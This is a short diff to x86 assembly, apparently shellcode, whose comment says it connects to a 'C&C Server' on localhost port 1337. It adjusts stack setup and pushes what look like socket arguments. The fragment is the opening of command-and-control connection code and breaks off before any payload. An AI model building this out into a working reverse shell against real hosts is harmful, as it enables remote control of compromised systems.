@@ -1,7 +1,6 @@
 # Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
-sub esp, 1500
-mov ebp, esp
-sub esp, 100
+#mov ebp, esp
+sub esp, 40
 push   0
 push   1
 push   2
